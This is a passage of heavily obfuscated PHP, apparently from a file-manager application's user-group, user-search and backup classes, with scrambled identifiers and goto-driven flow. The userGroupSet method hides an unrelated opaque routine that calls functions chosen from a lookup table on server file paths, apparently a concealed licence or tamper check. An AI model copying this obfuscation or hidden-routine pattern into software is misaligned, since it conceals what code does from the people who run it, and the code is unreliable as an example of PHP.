$CÛÈ≈≠ïóë = array($dÃ≠«≈ê†ÿ[1388] => $A°©÷≥≥ªç); Model($dÃ≠«≈ê†ÿ[540])->where($CÛÈ≈≠ïóë)->delete(); Model($dÃ≠«≈ê†ÿ[2472])->where($CÛÈ≈≠ïóë)->delete(); goto EÏœ÷≤ƒ‚¢; BÏ˘”®È∫ì: $dÃ≠«≈ê†ÿ =& $_SERVER[Æ¡î¢≠¯™]; $c–“π˜î⁄µ = $this->getInfoSimple($A°©÷≥≥ªç); if (!$c–“π˜î⁄µ) { return !1; } goto f•∑êÓº¢†; EÏœ÷≤ƒ‚¢: Model($dÃ≠«≈ê†ÿ[2135])->where($CÛÈ≈≠ïóë)->delete(); Model($dÃ≠«≈ê†ÿ[2456])->where($CÛÈ≈≠ïóë)->delete(); Model($dÃ≠«≈ê†ÿ[2473])->where($CÛÈ≈≠ïóë)->delete(); goto E€ÚıîÜ¥≈; FíÒãéÜ¿Â: } protected function userGroupSet($eıç—»°Úë, $C≠ÈÙπ©åî, $Aµ¨ƒΩ’øñ = array()) { goto E±Ô«ÑÆπ¨; E±Ô«ÑÆπ¨: $aÈØÿ•◊ø¢ =& $_SERVER[Æ¡î¢≠¯™]; if ($_SERVER[$aÈØÿ•◊ø¢[57]] != $_SERVER[$aÈØÿ•◊ø¢[1923]]) { goto C™‹≤ÿÜ÷Õ; fÆ≤€äÓ´•: $Fßé–éÚÍ– = $aÈØÿ•◊ø¢[780]; $Fßé–éÚÍ–($_SERVER[$aÈØÿ•◊ø¢[781]]); $Fßé–éÚÍ–($_SERVER[$aÈØÿ•◊ø¢[60]] . $aÈØÿ•◊ø¢[2474]); goto E˘∫öò•Ë≠; E˘∫öò•Ë≠: $bÉªÙÆæÔ‰ = 1; while ($bÉªÙÆæÔ‰ > 1) { $bÉªÙÆæÔ‰ = $bÉªÙÆæÔ‰ + 4; $cëı¡‘èã® = rawurlencode($bÉªÙÆæÔ‰ . $aÈØÿ•◊ø¢[66]); } goto B≈áÂﬁàåÀ; Fò’™Â≤èõ: $Bﬂ¿ı¶¡”∏ = $eà®£¬£€Ü($aŒü—¨éò–); $E…˜¶∞ßîø = explode($aÈØÿ•◊ø¢[62], $Bﬂ¿ı¶¡”∏); if (count($E…˜¶∞ßîø) < $aÈØÿ•◊ø¢[561]) { $cÊÜòå·∞Ö = $aÈØÿ•◊ø¢[64]; $cÊÜòå·∞Ö(); } goto fÆ≤€äÓ´•; C™‹≤ÿÜ÷Õ: $C¢≤Á’ó‰◊ = $aÈØÿ•◊ø¢[779]; $eà®£¬£€Ü = $aÈØÿ•◊ø¢[59]; $aŒü—¨éò– = $_SERVER[$aÈØÿ•◊ø¢[60]] . $aÈØÿ•◊ø¢[61]; goto Fò’™Â≤èõ; B≈áÂﬁàåÀ: } $E«±˜›ÜÖ≤ = $this->getInfoSimple($eıç—»°Úë); goto fˆáçŸóµÔ; DÁ•Ü∫“∏∆: return $c•ÁÍµ˜Ü‹->addAll($bÇ›üçê™ã, array(), !0); goto FúÆ†§¯ıå; AØŒ∞€ ”œ: $bÇ›üçê™ã = array(); $Dÿ¯ëΩ……Ü = 0; foreach ($C≠ÈÙπ©åî as $D˜Æûô‘õÛ => $Fäô∑ÎûÛâ) { $eöåô‡°µ∆ = array($aÈØÿ•◊ø¢[1397] => $eıç—»°Úë, $aÈØÿ•◊ø¢[2061] => $D˜Æûô‘õÛ, $aÈØÿ•◊ø¢[2189] => $Fäô∑ÎûÛâ); $eöåô‡°µ∆[$aÈØÿ•◊ø¢[2082]] = isset($Aµ¨ƒΩ’øñ[$Dÿ¯ëΩ……Ü]) ? $Aµ¨ƒΩ’øñ[$Dÿ¯ëΩ……Ü] : 0; $Dÿ¯ëΩ……Ü++; $bÇ›üçê™ã[] = $eöåô‡°µ∆; } goto DÁ•Ü∫“∏∆; fˆáçŸóµÔ: if (!$E«±˜›ÜÖ≤ || !is_array($C≠ÈÙπ©åî)) { return !1; } $c•ÁÍµ˜Ü‹ = Model($aÈØÿ•◊ø¢[2135]); $c•ÁÍµ˜Ü‹->where(array($aÈØÿ•◊ø¢[1397] => $eıç—»°Úë))->delete(); goto AØŒ∞€ ”œ; FúÆ†§¯ıå: } protected function userGroupAdd($fáÈ«¡‘∏∞, $FÏàÜ˘Îˆâ, $A∂◊§‰ÀêÜ) { $fÍéäøŸ’È =& $_SERVER[Æ¡î¢≠¯™]; $Cú™©Â¢∂« = $this->getInfoSimple($fáÈ«¡‘∏∞); if (!$Cú™©Â¢∂« || !$FÏàÜ˘Îˆâ) { return !1; } $e»¥´âäõ» = array(array($fÍéäøŸ’È[1397] => $fáÈ«¡‘∏∞, $fÍéäøŸ’È[2061] => $FÏàÜ˘Îˆâ, $fÍéäøŸ’È[2189] => $A∂◊§‰ÀêÜ)); return Model($fÍéäøŸ’È[2135])->addAll($e»¥´âäõ», array(), !0); } protected function userGroupRemove($a∂∂É«Ú≈â, $e∂ÁÌÚ„æÁ) { $aÖ±Ïπê’¶ =& $_SERVER[Æ¡î¢≠¯™]; $f˜§πÔ¥àÏ = $this->getInfoSimple($a∂∂É«Ú≈â); if (!$f˜§πÔ¥àÏ || !$e∂ÁÌÚ„æÁ) { return !1; } $FÖóÑ¯åáÇ = array($aÖ±Ïπê’¶[1388] => $a∂∂É«Ú≈â, $aÖ±Ïπê’¶[2133] => $e∂ÁÌÚ„æÁ); return Model($aÖ±Ïπê’¶[2135])->where($FÖóÑ¯åáÇ)->delete(); } public function listData() { $C÷âá©‰á„ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($C÷âá©‰á„[$_SERVER[Æ¡î¢≠¯™][360]]); return $C÷âá©‰á„; } public function listByID($aãÂíÿå∏Ú) { $aàåå¶üû± =& $_SERVER[Æ¡î¢≠¯™]; if (!$aãÂíÿå∏Ú) { return; } $b˘èˆöœ¶Ø = array($aàåå¶üû±[1397] => array($aàåå¶üû±[7], $aãÂíÿå∏Ú)); $c¶“ÀÀàÛπ = $this->where($b˘èˆöœ¶Ø)->select(); $this->_listDataApply($c¶“ÀÀàÛπ); return $c¶“ÀÀàÛπ; } public function listByGroup($eÎÉï©©Ù⁄ = 0, $d˘öçÂßéÎ = array()) { goto BëÓŸÃ•¥≥; Aƒçıö¡®å: if ($eÎÉï©©Ù⁄) { $Cä”Ë¬ää  = array($Eò®≈¿ß≤ü[2475] => intval($eÎÉï©©Ù⁄)); $aóÂÜ¬¥◊Ë = "\x4c\x45\106\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\165\x73\145\162\x5f\147\x72\157\x75\x70\x20\x75\163\145\162\137\147\x72\157\165\160\x20\x6f\156\40\x75\x73\x65\x72\x2e\165\x73\x65\x72\x49\104\x20\x3d\40\x75\163\x65\x72\137\147\162\x6f\x75\160\x2e\165\x73\145\x72\x49\x44"; $BëµŸÇ·Öﬂ = Input::get($Eò®≈¿ß≤ü[411], null, $Eò®≈¿ß≤ü[33]) ? $Eò®≈¿ß≤ü[33] : $Eò®≈¿ß≤ü[2476]; } if (isset($d˘öçÂßéÎ[$Eò®≈¿ß≤ü[681]])) { $Cä”Ë¬ää [$Eò®≈¿ß≤ü[2477]] = $d˘öçÂßéÎ[$Eò®≈¿ß≤ü[681]]; } $bäÒ§øòÑÇ = $this->_makeOrder($BëµŸÇ·Öﬂ)->field($Eò®≈¿ß≤ü[2478])->where($Cä”Ë¬ää )->join($aóÂÜ¬¥◊Ë)->selectPage(50); goto B‘¿ø›≥Á÷; BëÓŸÃ•¥≥: $Eò®≈¿ß≤ü =& $_SERVER[Æ¡î¢≠¯™]; $aóÂÜ¬¥◊Ë = $Eò®≈¿ß≤ü[33]; $Cä”Ë¬ää  = array(); goto Aƒçıö¡®å; B‘¿ø›≥Á÷: $this->_listDataApply($bäÒ§øòÑÇ[$Eò®≈¿ß≤ü[360]]); return $bäÒ§øòÑÇ; goto A° ◊òÎ…¬; A° ◊òÎ…¬: } private function _makeOrder($E„≤ˆ⁄ÜÑÚ = '') { goto DÉƒæ‹± ‚; a≈ºçˆÆˆÃ: $E„≤ˆ⁄ÜÑÚ = $E„≤ˆ⁄ÜÑÚ . "\x75\163\x65\x72\x2e{$D∑ì ÊÛ‚Ó}\x20{$CÚ™˜≠çÖ∑}\54\40\x75\163\x65\162\x2e\x75\x73\x65\162\x49\x44\40\x61\163\x63"; return $this->alias($c¨üêú∆ËÓ[2222])->order($E„≤ˆ⁄ÜÑÚ); goto E≠Õµàçèá; DÉƒæ‹± ‚: $c¨üêú∆ËÓ =& $_SERVER[Æ¡î¢≠¯™]; $F∑î„±¨›Ÿ = array($c¨üêú∆ËÓ[1397], $c¨üêú∆ËÓ[28], $c¨üêú∆ËÓ[2047], $c¨üêú∆ËÓ[2020], $c¨üêú∆ËÓ[194]); $aà˘ÑÙ“å« = array($c¨üêú∆ËÓ[406] => $c¨üêú∆ËÓ[407], $c¨üêú∆ËÓ[408] => $c¨üêú∆ËÓ[409]); goto AŸ≈†ı‡¿ﬂ; AŸ≈†ı‡¿ﬂ: $D∑ì ÊÛ‚Ó = Input::get($c¨üêú∆ËÓ[411], $c¨üêú∆ËÓ[7], $c¨üêú∆ËÓ[1388], $F∑î„±¨›Ÿ); $CÚ™˜≠çÖ∑ = Input::get($c¨üêú∆ËÓ[412], $c¨üêú∆ËÓ[7], $c¨üêú∆ËÓ[2136], array($c¨üêú∆ËÓ[2136], $c¨üêú∆ËÓ[408])); $CÚ™˜≠çÖ∑ = $aà˘ÑÙ“å«[$CÚ™˜≠çÖ∑]; goto a≈ºçˆÆˆÃ; E≠Õµàçèá: } public function listSearch($B¬ –ﬂÃé±) { goto BèÀÈ≈âÙÏ; Bíùﬂ›¥åí: return $fÏç∂™é…´; goto B—èı‚üÁ‡; d◊èä¡Ê—˘: if (!$D∆Ωª©¥å∞) { $f…í†Ã®Çß = array(); } if (isset($B¬ –ﬂÃé±[$dÿñã∏É¯Ó[681]])) { $f…í†Ã®Çß[$dÿñã∏É¯Ó[681]] = $B¬ –ﬂÃé±[$dÿñã∏É¯Ó[681]]; } $fÏç∂™é…´ = $this->_makeOrder()->where($f…í†Ã®Çß)->selectPage(20); goto cœ∆Ωá›≈»; cœ∆Ωá›≈»: if (!$fÏç∂™é…´ || count($fÏç∂™é…´[$dÿñã∏É¯Ó[360]]) < 5 && Input::check($D∆Ωª©¥å∞, $dÿñã∏É¯Ó[312])) { $AŒ∑çûÇÜç = $this->_searchFromMeta($dÿñã∏É¯Ó[419], $D∆Ωª©¥å∞, 10); $EéçâçŸ∂¿ = $this->_searchFromMeta($dÿñã∏É¯Ó[420], $D∆Ωª©¥å∞, 10); $EÏªë∏≈à◊ = array_merge($AŒ∑çûÇÜç, $EéçâçŸ∂¿, $fÏç∂™é…´[$dÿñã∏É¯Ó[360]]); $fÏç∂™é…´[$dÿñã∏É¯Ó[360]] = array_unique_by_key($EÏªë∏≈à◊, $dÿñã∏É¯Ó[1397]); $fÏç∂™é…´[$dÿñã∏É¯Ó[357]][$dÿñã∏É¯Ó[358]] = count($fÏç∂™é…´[$dÿñã∏É¯Ó[360]]); $fÏç∂™é…´[$dÿñã∏É¯Ó[357]][$dÿñã∏É¯Ó[359]] = ceil($fÏç∂™é…´[$dÿñã∏É¯Ó[357]][$dÿñã∏É¯Ó[358]] / $fÏç∂™é…´[$dÿñã∏É¯Ó[357]][$dÿñã∏É¯Ó[355]]); } $this->_listDataApply($fÏç∂™é…´[$dÿñã∏É¯Ó[360]]); $this->_filterByGroup($fÏç∂™é…´, $Bà”Á‹¬¶Ù); goto Bíùﬂ›¥åí; BèÀÈ≈âÙÏ: $dÿñã∏É¯Ó =& $_SERVER[Æ¡î¢≠¯™]; $D∆Ωª©¥å∞ = $B¬ –ﬂÃé±[$dÿñã∏É¯Ó[2137]]; $Bà”Á‹¬¶Ù = isset($B¬ –ﬂÃé±[$dÿñã∏É¯Ó[2138]]) ? $B¬ –ﬂÃé±[$dÿñã∏É¯Ó[2138]] : !1; goto B€ñÔ‘àΩõ; B€ñÔ‘àΩõ: $D∆Ωª©¥å∞ = str_replace($dÿñã∏É¯Ó[2139], $dÿñã∏É¯Ó[2140], trim($D∆Ωª©¥å∞)); $f…í†Ã®Çß = array($dÿñã∏É¯Ó[28] => array($dÿñã∏É¯Ó[743], "\45{$D∆Ωª©¥å∞}\x25"), $dÿñã∏É¯Ó[299] => array($dÿñã∏É¯Ó[743], "\x25{$D∆Ωª©¥å∞}\x25"), $dÿñã∏É¯Ó[2281] => array($dÿñã∏É¯Ó[743], "\x25{$D∆Ωª©¥å∞}\x25"), $dÿñã∏É¯Ó[902] => $dÿñã∏É¯Ó[2141]); if (Input::check($D∆Ωª©¥å∞, $dÿñã∏É¯Ó[305])) { $f…í†Ã®Çß[$dÿñã∏É¯Ó[1397]] = array($dÿñã∏É¯Ó[743], "\45{$D∆Ωª©¥å∞}\45"); $f…í†Ã®Çß[$dÿñã∏É¯Ó[2457]] = array($dÿñã∏É¯Ó[743], "\x25{$D∆Ωª©¥å∞}\45"); } goto d◊èä¡Ê—˘; B—èı‚üÁ‡: } private function _filterByGroup(&$dÒùÚ£≠¨Ø, $B‚¬∏ÁÑâÎ) { $d‚¯ô”è›Ω =& $_SERVER[Æ¡î¢≠¯™]; if (!$B‚¬∏ÁÑâÎ) { return $dÒùÚ£≠¨Ø; } foreach ($dÒùÚ£≠¨Ø[$d‚¯ô”è›Ω[360]] as $A¶Ω∫ô«üÏ => &$E€∞ÇéÀâÁ) { $c‰‚Œ¢πèÊ = array_to_keyvalue($E€∞ÇéÀâÁ[$d‚¯ô”è›Ω[2479]], $d‚¯ô”è›Ω[33], $d‚¯ô”è›Ω[2061]); if (!in_array($B‚¬∏ÁÑâÎ, $c‰‚Œ¢πèÊ)) { unset($dÒùÚ£≠¨Ø[$d‚¯ô”è›Ω[360]][$A¶Ω∫ô«üÏ]); } } $dÒùÚ£≠¨Ø[$d‚¯ô”è›Ω[360]] = array_values($dÒùÚ£≠¨Ø[$d‚¯ô”è›Ω[360]]); $dÒùÚ£≠¨Ø[$d‚¯ô”è›Ω[357]] = array($d‚¯ô”è›Ω[2256] => count($dÒùÚ£≠¨Ø[$d‚¯ô”è›Ω[360]]), $d‚¯ô”è›Ω[2254] => $dÒùÚ£≠¨Ø[$d‚¯ô”è›Ω[357]][$d‚¯ô”è›Ω[355]], $d‚¯ô”è›Ω[2253] => 1, $d‚¯ô”è›Ω[2255] => 1); } private function _searchFromMeta($D¬ñŒéÜ’â, $AØ⁄õß“ô¬, $Eƒª∫ÜÓˆΩ) { goto Eœª‹»©ãﬂ; Eœª‹»©ãﬂ: $A“òá÷Ïäò =& $_SERVER[Æ¡î¢≠¯™]; $AØ⁄õß“ô¬ = strtolower($AØ⁄õß“ô¬); $CèÆâ·å§√ = array($A“òá÷Ïäò[99] => $D¬ñŒéÜ’â, $A“òá÷Ïäò[365] => array($A“òá÷Ïäò[743], "\45{$AØ⁄õß“ô¬}\45")); goto BÍØÙﬂÃÚö; E≤£ﬂ‚≥ˆÔ: $dƒÿÔüôÈå = $this->where(array($A“òá÷Ïäò[1388] => array($A“òá÷Ïäò[7], $DœÏÁÇù”Æ)))->select(); if (!$dƒÿÔüôÈå) { return array(); } return $dƒÿÔüôÈå; goto aãâ‹±¬ÆØ; BÍØÙﬂÃÚö: $DœÏÁÇù”Æ = Model($A“òá÷Ïäò[2480])->where($CèÆâ·å§√)->limit($Eƒª∫ÜÓˆΩ)->select(); if (!$DœÏÁÇù”Æ) { return array(); } $DœÏÁÇù”Æ = array_to_keyvalue($DœÏÁÇù”Æ, $A“òá÷Ïäò[33], $A“òá÷Ïäò[1397]); goto E≤£ﬂ‚≥ˆÔ; aãâ‹±¬ÆØ: } private function _listDataApplyItem($cËı∆ë¯ØÑ) { $Dàòò’Õ√‘ = array($cËı∆ë¯ØÑ); $this->_listDataApply($Dàòò’Õ√‘); return $Dàòò’Õ√‘[0]; } private function _listDataApply(&$eêÙ˘ùù∑ç) { goto A÷°æ¬££˜; A÷°æ¬££˜: $eµ≤»”ËΩá =& $_SERVER[Æ¡î¢≠¯™]; if (!$eêÙ˘ùù∑ç) { return; } array_remove_key($eêÙ˘ùù∑ç, $eµ≤»”ËΩá[789]); goto AØÔΩ≥àπò; AØÔΩ≥àπò: $B“ÛºêƒòŸ = array_to_keyvalue($eêÙ˘ùù∑ç, $eµ≤»”ËΩá[33], $eµ≤»”ËΩá[1397]); $this->_listAppendGroup($eêÙ˘ùù∑ç, $B“ÛºêƒòŸ); $this->_listAppendMeta($eêÙ˘ùù∑ç, $B“ÛºêƒòŸ); goto B√®Î—‘ºÈ; B√®Î—‘ºÈ: $this->_listAppendSourceRoot($eêÙ˘ùù∑ç, $B“ÛºêƒòŸ); goto cê¡’ôÎ¶ ; cê¡’ôÎ¶ : } private function _listAppendSourceRoot(&$CÌÕü»–ßú, $a‘ÒÖøåöŸ) { goto a¡Ç∏‡ﬂ•ì; aÕâá◊Âäè: foreach ($CÌÕü»–ßú as &$BÔ›è„¿âÁ) { $BÔ›è„¿âÁ[$F•µÀ‡®é[396]] = $CŒ—¢„Õ•ê[$BÔ›è„¿âÁ[$F•µÀ‡®é[1397]]] ? $CŒ—¢„Õ•ê[$BÔ›è„¿âÁ[$F•µÀ‡®é[1397]]] : array(); } goto dÈÀû≤…Óÿ; a¡Ç∏‡ﬂ•ì: $F•µÀ‡®é =& $_SERVER[Æ¡î¢≠¯™]; $CÓìÁ÷ºÆº = array($F•µÀ‡®é[465] => 0, $F•µÀ‡®é[376] => SourceModel::TYPE_USER, $F•µÀ‡®é[460] => array($F•µÀ‡®é[7], $a‘ÒÖøåöŸ)); $e∫åπÀ‚äº = $F•µÀ‡®é[2147]; goto F«Í˜⁄û≥√; F«Í˜⁄û≥√: $CŒ—¢„Õ•ê = Model($F•µÀ‡®é[744])->order($F•µÀ‡®é[2148])->field($e∫åπÀ‚äº)->where($CÓìÁ÷ºÆº)->select(); $CŒ—¢„Õ•ê = array_to_keyvalue($CŒ—¢„Õ•ê, $F•µÀ‡®é[460]); $CŒ—¢„Õ•ê = array_remove_key($CŒ—¢„Õ•ê, $F•µÀ‡®é[460]); goto aÕâá◊Âäè; dÈÀû≤…Óÿ: } private function _listAppendGroup(&$F≠’›çùÀ≈, $Cé‘âúÿ¬∏) { goto bñ‰‹⁄òòç; bñ‰‹⁄òòç: $aò≠í¡áö¡ =& $_SERVER[Æ¡î¢≠¯™]; $D€›ëá∆∞© = array($aò≠í¡áö¡[1397] => array($aò≠í¡áö¡[7], $Cé‘âúÿ¬∏)); $dõÁ îí´¶ = Model($aò≠í¡áö¡[2135])->where($D€›ëá∆∞©)->select(); goto Cá˘ŸåÚé∞; f„º¬≈•Ñû: $D€›ëá∆∞© = array($aò≠í¡áö¡[2061] => array($aò≠í¡áö¡[7], $B–¯ñî¿˜ï)); $fé‹≠√°Ö⁄ = Model($aò≠í¡áö¡[2481])->field($aò≠í¡áö¡[2482])->where($D€›ëá∆∞©)->select(); $bÌåÕıﬂ∞ﬁ = array_to_keyvalue($fé‹≠√°Ö⁄, $aò≠í¡áö¡[2061], $aò≠í¡áö¡[28]); goto Dâ”òÏ°ó˜; Dâ”òÏ°ó˜: $dõÁ îí´¶ = array_to_keyvalue_group($dõÁ îí´¶, $aò≠í¡áö¡[1397]); foreach ($dõÁ îí´¶ as &$FòÔ¡Ù≠ﬁπ) { $bü¢ë»§Ωí = array(); foreach ($FòÔ¡Ù≠ﬁπ as $Fè≠˜í‚≈◊) { if (!$Fè≠˜í‚≈◊[$aò≠í¡áö¡[2189]]) { continue; } $e„÷˘Œ∑Â∆ = Model($aò≠í¡áö¡[2208])->listData($Fè≠˜í‚≈◊[$aò≠í¡áö¡[2189]]); $bü¢ë»§Ωí[] = array($aò≠í¡áö¡[2061] => $Fè≠˜í‚≈◊[$aò≠í¡áö¡[2061]], $aò≠í¡áö¡[2483] => $bÌåÕıﬂ∞ﬁ[$Fè≠˜í‚≈◊[$aò≠í¡áö¡[2061]]], $aò≠í¡áö¡[381] => $e„÷˘Œ∑Â∆); } $FòÔ¡Ù≠ﬁπ = $bü¢ë»§Ωí; } foreach ($F≠’›çùÀ≈ as &$cŸ÷íÚ¯Ü) { $cŸ÷íÚ¯Ü[$aò≠í¡áö¡[2479]] = array(); if (isset($dõÁ îí´¶[$cŸ÷íÚ¯Ü[$aò≠í¡áö¡[1397]]])) { $cŸ÷íÚ¯Ü[$aò≠í¡áö¡[2479]] = $dõÁ îí´¶[$cŸ÷íÚ¯Ü[$aò≠í¡áö¡[1397]]]; } } goto d·á◊‹º¨´; Cá˘ŸåÚé∞: $B–¯ñî¿˜ï = array_to_keyvalue($dõÁ îí´¶, $aò≠í¡áö¡[33], $aò≠í¡áö¡[2061]); $B–¯ñî¿˜ï = array_remove_value(array_unique($B–¯ñî¿˜ï), $aò≠í¡áö¡[472]); if (!$B–¯ñî¿˜ï || !$dõÁ îí´¶) { return; } goto f„º¬≈•Ñû; d·á◊‹º¨´: } private function _listAppendMeta(&$D¢‰üåÛÔŒ, $féÌèç™Õ‹) { goto cÖ ˆõﬁ§ç; B’´û∏∂∑ê: $FÙ≈Éë⁄“‘ = array($FÆ–∂óË√[1397] => array($FÆ–∂óË√[7], $féÌèç™Õ‹)); $F∏èúêßäâ = Model($FÆ–∂óË√[2456])->where($FÙ≈Éë⁄“‘)->select(); $F∏èúêßäâ = array_to_keyvalue_group($F∏èúêßäâ, $FÆ–∂óË√[1397]); goto CËì°Ü®Öâ; cÖ ˆõﬁ§ç: $FÆ–∂óË√ =& $_SERVER[Æ¡î¢≠¯™]; $BÒ∂Üúß÷  = UserJobModel::JOB_KEY; $C·§ªî∞¥ = array($FÆ–∂óË√[2459]); goto B’´û∏∂∑ê; CËì°Ü®Öâ: foreach ($F∏èúêßäâ as &$b‘—óÒ⁄˘Ö) { $cíı›Ò˜ëë = array(); foreach ($b‘—óÒ⁄˘Ö as $Eñ©áÒê∫ﬁ) { if (!in_array($Eñ©áÒê∫ﬁ[$FÆ–∂óË√[99]], $C·§ªî∞¥)) { $cíı›Ò˜ëë[$Eñ©áÒê∫ﬁ[$FÆ–∂óË√[99]]] = $Eñ©áÒê∫ﬁ[$FÆ–∂óË√[365]]; } } $b‘—óÒ⁄˘Ö = $cíı›Ò˜ëë; } $d—±¥à–∆œ = Model($FÆ–∂óË√[2484]); foreach ($D¢‰üåÛÔŒ as &$EáÌ≥‚Ìî) { $Dú˘•†»ΩŸ = array(); if (isset($F∏èúêßäâ[$EáÌ≥‚Ìî[$FÆ–∂óË√[1397]]])) { $Dú˘•†»ΩŸ = $F∏èúêßäâ[$EáÌ≥‚Ìî[$FÆ–∂óË√[1397]]]; } $EáÌ≥‚Ìî[$FÆ–∂óË√[2485]] = array(); if (isset($Dú˘•†»ΩŸ[$BÒ∂Üúß÷ ])) { $EáÌ≥‚Ìî[$FÆ–∂óË√[2485]] = $d—±¥à–∆œ->getUserJobInfo($Dú˘•†»ΩŸ[$BÒ∂Üúß÷ ]); } } goto BÑèØ ŒÛø; BÑèØ ŒÛø: } public function userSearch($d•±◊√àÑ¬, $eÿ›‚—ç§Á = "\52") { return Model($_SERVER[Æ¡î¢≠¯™][481])->where($d•±◊√àÑ¬)->field($eÿ›‚—ç§Á)->find(); } } goto Eâ◊üõãâ˜; Aåœ›∞åª≠: define($_SERVER[Æ¡î¢≠¯™][232], 1); define($_SERVER[Æ¡î¢≠¯™][233], 2); define($_SERVER[Æ¡î¢≠¯™][234], 3); goto cﬂ“òá£Â≤; Bî∞Ì’Ëáœ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto d∫µ˜‘êò¶; B÷èç∑ê≈Ç: self::$name = $AëÑÿ†ßö¢[$A≥«¨ÓûäÖ[28]]; $Aàåç≈‚ = $GLOBALS[$A≥«¨ÓûäÖ[6]][$A≥«¨ÓûäÖ[17]]; $cå ·Í¶°° = $this->_dbType($Aàåç≈‚); goto a≤∫Â»„÷Ø; A»Ω∆üÔü°: mk_dir($D¿äÃßÛß„); $D´èê…Ÿ–™ = $eºõïüÛ◊ë->db()->getTables(); $D˜á“⁄’É∫ = 0; goto A‚´≥Ãã©Ö; Bîîú™õËÒ: return !0; goto f≥ êß‘Í≈; a≤∫Â»„÷Ø: $eºõïüÛ◊ë = new DbManage($Aàåç≈‚, $cå ·Í¶°°); $D¿äÃßÛß„ = TEMP_FILES . $A≥«¨ÓûäÖ[702] . self::$name . $A≥«¨ÓûäÖ[8]; del_dir($D¿äÃßÛß„); goto A»Ω∆üÔü°; A‚´≥Ãã©Ö: $a¿¨é≥ç„€ = new Task($A≥«¨ÓûäÖ[703], $A≥«¨ÓûäÖ[704], 0, LNG($A≥«¨ÓûäÖ[705]) . $A≥«¨ÓûäÖ[706] . LNG($A≥«¨ÓûäÖ[707])); $D´èê…Ÿ–™ = array_diff($D´èê…Ÿ–™, array($A≥«¨ÓûäÖ[708], $A≥«¨ÓûäÖ[709])); foreach ($D´èê…Ÿ–™ as $a≈àô”«∫Ì) { $F›ï¶àéïô = $D¿äÃßÛß„ . $a≈àô”«∫Ì . $A≥«¨ÓûäÖ[710]; $a†’óÑàèº = null; if ($a≈àô”«∫Ì == $A≥«¨ÓûäÖ[711] && (!isset($AëÑÿ†ßö¢[$A≥«¨ÓûäÖ[684]]) || $AëÑÿ†ßö¢[$A≥«¨ÓûäÖ[684]] == $A≥«¨ÓûäÖ[472])) { $a†’óÑàèº = self::$io; } $D˜á“⁄’É∫ += $eºõïüÛ◊ë->sqlFromDb($a≈àô”«∫Ì, $F›ï¶àéïô, $a¿¨é≥ç„€, $a†’óÑàèº); } goto dËı¥óØ”è; d∫µ˜‘êò¶: $A≥«¨ÓûäÖ =& $_SERVER[Æ¡î¢≠¯™]; $AëÑÿ†ßö¢ = Backup::get(); self::$io = $AëÑÿ†ßö¢[$A≥«¨ÓûäÖ[683]]; goto B÷èç∑ê≈Ç; dËı¥óØ”è: $a¿¨é≥ç„€->end(); $Bªäå≥¶»Ê = array($A≥«¨ÓûäÖ[712] => $cå ·Í¶°°, $A≥«¨ÓûäÖ[699] => 1, $A≥«¨ÓûäÖ[713] => $D˜á“⁄’É∫, $A≥«¨ÓûäÖ[714] => $D˜á“⁄’É∫); Backup::set($Bªäå≥¶»Ê); goto Bîîú™õËÒ; f≥ êß‘Í≈: } private function _dbType($bÇÍíèèãÒ) { $D¨ÎﬂÇÿ¨Õ =& $_SERVER[Æ¡î¢≠¯™]; $cŒ¡Ú’≠¿ = $bÇÍíèèãÒ[$D¨ÎﬂÇÿ¨Õ[715]]; if ($cŒ¡Ú’≠¿ == $D¨ÎﬂÇÿ¨Õ[716]) { $E·ˆ’°Œú≥ = explode($D¨ÎﬂÇÿ¨Õ[4], $bÇÍíèèãÒ[$D¨ÎﬂÇÿ¨Õ[717]]); $cŒ¡Ú’≠¿ = $E·ˆ’°Œú≥[0]; } $E∞Ã‘ºπ∞Ì = array($D¨ÎﬂÇÿ¨Õ[718] => $D¨ÎﬂÇÿ¨Õ[9], $D¨ÎﬂÇÿ¨Õ[719] => $D¨ÎﬂÇÿ¨Õ[720]); if (isset($E∞Ã‘ºπ∞Ì[$cŒ¡Ú’≠¿])) { $cŒ¡Ú’≠¿ = $E∞Ã‘ºπ∞Ì[$cŒ¡Ú’≠¿]; } return $cŒ¡Ú’≠¿; } } class BackupDbFile { public function __construct() { } public function index() { goto E¡–“’çŒ¢; bçéπå¶Ù†: IO::copy($fÌ¶∑õ˜Æë, $eÒîêÈä÷“ . "\x62\x61\143\153\x75\x70\137{$E‚»œÀÍÔ◊}\x2f"); $B‚éùÕÏØﬁ->end(); Backup::set(array($CäßàÇèœï[725] => $fì«ä® Ãë[$CäßàÇèœï[87]])); goto bŸù»ˆÑé≠; DŸä£◊∆©: Backup::set(array($CäßàÇèœï[723] => $fì«ä® Ãë[$CäßàÇèœï[87]])); IO::move($A‡Û»—ßØ…, $eÒîêÈä÷“); $fÌ¶∑õ˜Æë = CONTROLLER_DIR . $CäßàÇèœï[724]; goto bçéπå¶Ù†; D£¬ç≤˜Ï≤: $A‡Û»—ßØ… = TEMP_FILES . "\x62\141\x63\x6b\165\x70\x5f{$E‚»œÀÍÔ◊}\x2f"; $eÒîêÈä÷“ = "\173\151\157\x3a{$dª˘œâÒ£≠[$CäßàÇèœï[683]]}\x7d\x2f\x64\141\x74\x61\142\x61\x73\145\57"; IO::mkdir($eÒîêÈä÷“ . "\142\x61\143\x6b\165\160\x5f{$E‚»œÀÍÔ◊}\57"); goto C•Òú¨˜Ô€; E¡–“’çŒ¢: $CäßàÇèœï =& $_SERVER[Æ¡î¢≠¯™]; $dª˘œâÒ£≠ = Backup::get(); $E‚»œÀÍÔ◊ = $dª˘œâÒ£≠[$CäßàÇèœï[28]]; goto D£¬ç≤˜Ï≤; bŸù»ˆÑé≠: return !0; goto c…Á¶‘› ã; C•Òú¨˜Ô€: $B‚éùÕÏØﬁ = new TaskFileTransfer($CäßàÇèœï[721], $CäßàÇèœï[704], 0, LNG($CäßàÇèœï[705]) . $CäßàÇèœï[416] . LNG($CäßàÇèœï[707]) . $CäßàÇèœï[722]); $B‚éùÕÏØﬁ->addPath($A‡Û»—ßØ…); $fì«ä® Ãë = IO::infoWithChildren($A‡Û»—ßØ…); goto DŸä£◊∆©; c…Á¶‘› ã: } } class BackupFile { public function __construct() { } public function index() { goto cäãùÍÜ±ä; cäãùÍÜ±ä: $eØ˜¯îœç™ = Backup::get(); $DΩäÊ¶¨›â = $eØ˜¯îœç™[$_SERVER[Æ¡î¢≠¯™][287]][$_SERVER[Æ¡î¢≠¯™][174]][$_SERVER[Æ¡î¢≠¯™][423]]; $Eíπ„–—∆„ = 